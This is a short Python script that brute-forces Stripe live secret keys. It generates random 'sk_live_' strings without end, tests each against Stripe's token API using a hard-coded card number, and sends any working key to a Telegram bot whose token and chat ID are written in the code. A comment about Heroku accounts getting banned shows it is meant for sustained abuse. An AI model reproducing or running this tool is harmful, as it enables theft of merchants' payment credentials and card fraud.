import requests, random, string, time, os


def long_key():
  skkey = random.choice(['sk_live_51L', 'sk_live_51L'])+''.join(random.choices( string.digits + string.ascii_letters, k = 96))
  pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '4912461004526326','card[cvc]': '011','card[exp_month]': '04','card[exp_year]': '2024'}, auth=(skkey, ""))
  if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
    print(f"DEAD > {skkey}")
  else:
    print(f"LIVE > {skkey}")
    requests.get(url=f"https://api.telegram.org/bot5624443135:AAFPhl4KG-1JF8MR5X2qpWHgxgxeQMT5jp8/sendMessage?chat_id=5195866238&text=LIVE > {skkey}")
    
def short_key():
  skkey = "sk_live_"+''.join(random.choices( string.digits + string.ascii_letters, k = 24))
  pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '4912461004526326','card[cvc]': '011','card[exp_month]': '04','card[exp_year]': '2024'}, auth=(skkey, ""))
  if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
    print(f"DEAD > {skkey}")
  else:
    print(f"LIVE > {skkey}")
    requests.get(url=f"https://api.telegram.org/bot5624443135:AAFPhl4KG-1JF8MR5X2qpWHgxgxeQMT5jp8/sendMessage?chat_id=5195866238&text=LIVE > {skkey}")
    
while True:
  long_key()
  #time.sleep(0.5) #if your heroku account keeps getting banned
  short_key()
    
